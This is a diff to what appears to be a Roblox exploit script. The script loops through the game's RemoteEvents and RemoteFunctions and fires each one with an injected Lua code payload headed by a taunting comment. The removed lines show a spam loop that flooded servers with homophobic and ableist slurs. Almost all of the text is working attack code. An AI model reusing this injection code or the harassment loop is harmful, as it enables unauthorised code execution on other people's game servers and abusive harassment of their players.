@@ -11,37 +11,28 @@ for i, v in pairs(game:GetDescendants()) do
     if v:IsA("RemoteEvent") then
         for index, value in pairs(blacklisted) do
             if v.Name ~= value then
-                local Troll =
+                local CodeSetup =
                     "--[[ Hey, " ..
                     v:GetFullName() ..
                         " nice " ..
                             typeof(v) ..
                                 " you got there! Unfortunately, I already injected into your " ..
                                     v:GetFullName() .. "]] \n" .. code
-                v:FireServer(Troll)
-                if Annoy then
-                    while wait(1.5) do
-                        v:FireServer(
-                            "@everyone, Hello retarded faggots, me " ..
-                                game.Players.LocalPlayer.Name .. " the superior of this! 😈"
-                        )
-                    end
-                end
+                v:FireServer(CodeSetup)
             end
         end
         if RemoteFunctionsEnabled then
         elseif v:IsA("RemoteFunction") then
             for index, value in pairs(blacklisted) do
                 if v.Name ~= value then
-                    v:InvokeServer(code)
-                    if Annoy then
-                        while wait(1.5) do
-                            v:InvokeServer(
-                                "@everyone, Hello retarded faggots, me " ..
-                                    game.Players.LocalPlayer.Name .. " the superior of this! 😈"
-                            )
-                        end
-                    end
+                    local CodeSetup =
+                        "--[[ Hey, " ..
+                        v:GetFullName() ..
+                            " nice " ..
+                                typeof(v) ..
+                                    " you got there! Unfortunately, I already injected into your " ..
+                                        v:GetFullName() .. "]] \n" .. code
+                    v:InvokeServer(CodeSetup)
                 end
             end
         end
